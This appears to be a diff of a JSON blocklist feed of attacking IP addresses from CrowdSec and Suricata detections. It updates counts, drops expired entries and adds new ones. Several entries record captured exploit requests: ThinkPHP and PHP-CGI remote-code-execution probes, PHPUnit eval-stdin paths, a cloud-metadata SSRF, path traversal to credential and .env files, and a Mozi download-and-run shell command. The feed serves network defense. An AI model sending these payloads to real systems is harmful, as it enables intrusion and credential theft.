@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-09-07T13:00:00Z",
+  "generated_at": "2026-09-08T01:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 186,
-    "v4": 186,
+    "total": 176,
+    "v4": 176,
     "v6": 0
   },
   "items": [
@@ -138,355 +138,6 @@
         "GET /mac.php",
         "GET /1.php",
         "GET /4PJcpMFsD8B.php"
-      ]
-    },
-    {
-      "ip": "66.132.195.76",
-      "family": "v4",
-      "first_seen": "2026-08-31T23:00:00Z",
-      "last_seen": "2026-08-31T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398324",
-      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
-      "asn_prefix": "66.132.195.0/24",
-      "payloads": [
-        "GET /debug/pprof/",
-        "GET /robots.txt"
-      ]
-    },
-    {
-      "ip": "144.91.95.188",
-      "family": "v4",
-      "first_seen": "2026-08-31T22:00:00Z",
-      "last_seen": "2026-08-31T22:00:00Z",
-      "scenarios": [
-        "crowdsec/CVE-2017-9841",
-        "crowdsec/http-probing",
-        "crowdsec/thinkphp-cve-2018-20062"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "51167",
-      "asn_name": "CONTABO Contabo GmbH",
-      "asn_prefix": "144.91.94.0/23",
-      "payloads": [
-        "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
-        "POST /bin/sh",
-        "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
-        "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
-        "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
-        "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
-        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
-        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
-      ]
-    },
-    {
-      "ip": "195.37.190.88",
-      "family": "v4",
-      "first_seen": "2026-08-31T14:00:00Z",
-      "last_seen": "2026-08-31T14:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "680",
-      "asn_name": "DFN Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.",
-      "asn_prefix": "195.37.0.0/16",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "1.12.70.96",
-      "family": "v4",
-      "first_seen": "2026-08-31T23:00:00Z",
-      "last_seen": "2026-08-31T23:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "45090",
-      "asn_name": "TENCENT-NET-AP - Shenzhen Tencent Computer Systems Company Limited",
-      "asn_prefix": "1.12.64.0/18",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "57.154.243.64",
-      "family": "v4",
-      "first_seen": "2026-08-31T22:00:00Z",
-      "last_seen": "2026-08-31T22:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "57.152.0.0/14",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /developmentserver/metadatauploader"
-      ]
-    },
-    {
-      "ip": "43.135.133.241",
-      "family": "v4",
-      "first_seen": "2026-08-31T22:00:00Z",
-      "last_seen": "2026-08-31T22:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.135.128.0/18",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "150.109.10.41",
-      "family": "v4",
-      "first_seen": "2026-08-31T21:00:00Z",
-      "last_seen": "2026-08-31T21:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "150.109.10.0/23",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "137.184.105.192",
-      "family": "v4",
-      "first_seen": "2026-08-31T20:00:00Z",
-      "last_seen": "2026-08-31T20:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "137.184.96.0/20",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "101.53.229.34",
-      "family": "v4",
-      "first_seen": "2026-08-31T19:00:00Z",
-      "last_seen": "2026-08-31T19:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "101.53.229.0/24",
-      "payloads": [
-        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://101.53.229.34:55778/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
-      ]
-    },
-    {
-      "ip": "195.182.16.23",
-      "family": "v4",
-      "first_seen": "2026-08-31T19:00:00Z",
-      "last_seen": "2026-08-31T19:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "206264",
-      "asn_name": "AMARUTU-TECHNOLOGY Amarutu Technology Ltd",
-      "asn_prefix": "195.182.16.0/24",
-      "payloads": [
-        "GET /SDK/webLanguage"
-      ]
-    },
-    {
-      "ip": "162.159.142.9",
-      "family": "v4",
-      "first_seen": "2026-08-31T19:00:00Z",
-      "last_seen": "2026-08-31T19:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Response excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare",
-      "asn_prefix": "162.159.128.0/19",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /DigiCertTrustedRootG4.crl",
-        "GET /DigiCertAssuredIDRootCA.crl",
-        "GET /DigiCertHighAssuranceEVRootCA.crl"
-      ]
-    },
-    {
-      "ip": "43.153.15.51",
-      "family": "v4",
-      "first_seen": "2026-08-31T19:00:00Z",
-      "last_seen": "2026-08-31T19:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.153.0.0/18",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "43.130.53.252",
-      "family": "v4",
-      "first_seen": "2026-08-31T17:00:00Z",
-      "last_seen": "2026-08-31T17:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.130.0.0/18",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "20.51.230.169",
-      "family": "v4",
-      "first_seen": "2026-08-31T16:00:00Z",
-      "last_seen": "2026-08-31T16:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.48.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "43.135.115.233",
-      "family": "v4",
-      "first_seen": "2026-08-31T14:00:00Z",
-      "last_seen": "2026-08-31T14:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.135.64.0/18",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "43.130.131.18",
-      "family": "v4",
-      "first_seen": "2026-08-31T14:00:00Z",
-      "last_seen": "2026-08-31T14:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.130.128.0/19",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "43.165.195.234",
-      "family": "v4",
-      "first_seen": "2026-08-31T13:00:00Z",
-      "last_seen": "2026-08-31T13:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.165.192.0/19",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "43.153.26.165",
-      "family": "v4",
-      "first_seen": "2026-09-01T00:00:00Z",
-      "last_seen": "2026-09-01T00:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP Request excessive header repetition"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.153.0.0/18",
-      "payloads": [
-        "GET /"
       ]
     },
     {
@@ -4515,6 +4166,228 @@
       "asn_prefix": "171.25.193.0/24",
       "tags": [
         "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "34.84.168.240",
+      "family": "v4",
+      "first_seen": "2026-09-08T00:00:00Z",
+      "last_seen": "2026-09-08T00:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing",
+        "suricata/ET WEB_SERVER /etc/passwd Detected in URI"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.84.160.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /_profiler/phpinfo",
+        "GET /phpinfo.php",
+        "GET /app_dev.php/_profiler/phpinfo",
+        "GET /api/webhook?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
+        "GET /azure-credentials.json",
+        "GET /@fs/proc/self/environ?import&raw??",
+        "GET /.git/index",
+        "GET /.github/workflows/ci.yml",
+        "GET /.gitlab-ci.yml",
+        "GET /",
+        "GET /__aws_leak_probe_8f878624__",
+        "GET /static../.env",
+        "GET /media../.env",
+        "GET /proc/self/environ",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /static../.aws/credentials",
+        "GET /files../etc/passwd",
+        "GET /static../.azure/credentials",
+        "GET /static../etc/passwd",
+        "GET /@fs/proc/self/environ",
+        "GET /@fs/proc/self/environ?raw??",
+        "GET /media../etc/passwd",
+        "GET /assets../../../etc/passwd"
+      ]
+    },
+    {
+      "ip": "143.198.214.233",
+      "family": "v4",
+      "first_seen": "2026-09-07T23:00:00Z",
+      "last_seen": "2026-09-07T23:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "143.198.208.0/20",
+      "payloads": [
+        "POST /wp-json/batch/v1"
+      ]
+    },
+    {
+      "ip": "51.68.107.148",
+      "family": "v4",
+      "first_seen": "2026-09-07T22:00:00Z",
+      "last_seen": "2026-09-07T22:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "16276",
+      "asn_name": "OVH OVH SAS",
+      "asn_prefix": "51.68.0.0/16",
+      "payloads": [
+        "GET /robots.txt",
+        "GET /"
+      ]
+    },
+    {
+      "ip": "34.51.186.252",
+      "family": "v4",
+      "first_seen": "2026-09-07T19:00:00Z",
+      "last_seen": "2026-09-07T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.51.128.0/17",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /service-account.json",
+        "GET /sa.json",
+        "GET /gcp-key.json",
+        "GET /gcp-credentials.json",
+        "GET /gcp-sa.json",
+        "GET /info.php",
+        "GET /admin/.env",
+        "GET /admin-panel/.env",
+        "GET /administrator/.env",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "103.46.186.148",
+      "family": "v4",
+      "first_seen": "2026-09-07T18:00:00Z",
+      "last_seen": "2026-09-07T18:00:00Z",
+      "scenarios": [
+        "crowdsec/CVE-2017-9841",
+        "crowdsec/http-probing",
+        "crowdsec/thinkphp-cve-2018-20062"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "150462",
+      "asn_name": "IDNIC-AIRLINK-AS-ID - PT Air Lintas Komunikasi",
+      "asn_prefix": "103.46.186.0/24",
+      "payloads": [
+        "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
+        "POST /bin/sh",
+        "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
+      ]
+    },
+    {
+      "ip": "66.132.224.231",
+      "family": "v4",
+      "first_seen": "2026-09-07T17:00:00Z",
+      "last_seen": "2026-09-07T17:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.224.0/24",
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "20.55.77.33",
+      "family": "v4",
+      "first_seen": "2026-09-07T15:00:00Z",
+      "last_seen": "2026-09-07T15:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.48.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "199.45.154.127",
+      "family": "v4",
+      "first_seen": "2026-09-08T00:00:00Z",
+      "last_seen": "2026-09-08T00:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP2 too long frame data"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.154.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
       ]
     }
   ]
